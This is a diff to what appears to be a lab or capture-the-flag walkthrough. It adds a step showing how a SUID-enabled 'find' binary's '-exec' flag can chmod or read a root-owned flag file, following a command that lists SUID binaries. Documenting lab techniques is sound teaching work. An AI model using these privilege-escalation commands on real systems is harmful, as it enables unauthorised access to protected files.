@@ -31,6 +31,16 @@ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 
 ![](imgs/suid.png)
 
+4.) Using the binary "find" and the SUID bit set, we can use the -exec flag to run commands of the owner of the bin. 
+
+```bash
+find flag1.txt -exec chmod 777 flag1.txt \;
+or
+find flag1.txt -exec cat flag1.txt \;
+```
+
+![](imgs/find.png)
+
 ## Tasks
 | Task | Question | Answer |
 | --- | --- | --- |
